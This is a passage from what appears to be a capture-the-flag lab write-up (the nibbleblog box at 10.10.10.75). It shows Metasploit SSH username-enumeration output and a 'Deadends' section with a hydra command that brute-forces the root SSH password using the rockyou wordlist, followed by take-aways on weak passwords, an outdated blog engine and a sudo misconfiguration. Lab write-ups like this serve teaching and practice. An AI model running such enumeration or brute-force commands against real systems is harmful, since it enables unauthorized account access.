+[-] 10.10.10.75:22 - SSH - User &#39;symop&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;sync&#39; found
+[+] 10.10.10.75:22 - SSH - User &#39;sys&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;sysadm&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;sysadmin&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;sysbin&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;syslog&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;system_admin&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;systemd-bus-proxy&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;systemd-coredump&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;systemd-network&#39; found
+[+] 10.10.10.75:22 - SSH - User &#39;systemd-resolve&#39; found
+[+] 10.10.10.75:22 - SSH - User &#39;systemd-timesync&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;tcpdump&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;trouble&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;tss&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;udadmin&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;ultra&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;umountfs&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;umountfsys&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;umountsys&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;unix&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;unscd&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;us_admin&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;usbmux&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;user&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;uucp&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;uucpadm&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;uuidd&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;vagrant&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;varnish&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;web&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;webmaster&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;whoopsie&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;www&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;www-data&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;xpdb&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;xpopr&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;zabbix&#39; not found
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre></div><h3 id="bruteforce">Bruteforce</h3>
+<p>I ran a bruteforce against SSH in background, in case it came up with something (spoiler: it didn&rsquo;t).</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">hydra -l root -P /usr/share/dict/rockyou.txt 10.10.10.75 -t 4 ssh
+</code></pre></div><ul>
+<li><code>-l</code> is the user to bruteforce</li>
+<li><code>-P</code> is the path to the wordlist</li>
+<li><code>-t 4</code> is the number of tasks</li>
+</ul>
+<h1 id="take-aways">Take-Aways</h1>
+<ul>
+<li>We&rsquo;ve seen how to use Hydra to bruteforce ssh and HTTP POST forms</li>
+<li>Avoid using guessable passwords when you&rsquo;re an admin</li>
+<li>Avoid using obscure blog engines with published RCEs. I think nibbleblog was EOL&rsquo;ed, so migrate to another blog engine is the only solution.</li>
+<li>The privesc used a bad configuration of <code>sudo</code> allowing the user to run root commands without a password.</li>
+</ul>
+<p><img src="img/cat_tiger_plush.gif" alt="cat against tiger plush"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#deadends">Deadends</a>
+      <ul>
+        <li><a href="#ssh">SSH</a>
+          <ul>
+            <li><a href="#enumusers">enumusers</a></li>
+            <li><a href="#bruteforce">Bruteforce</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#take-aways">Take-Aways</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
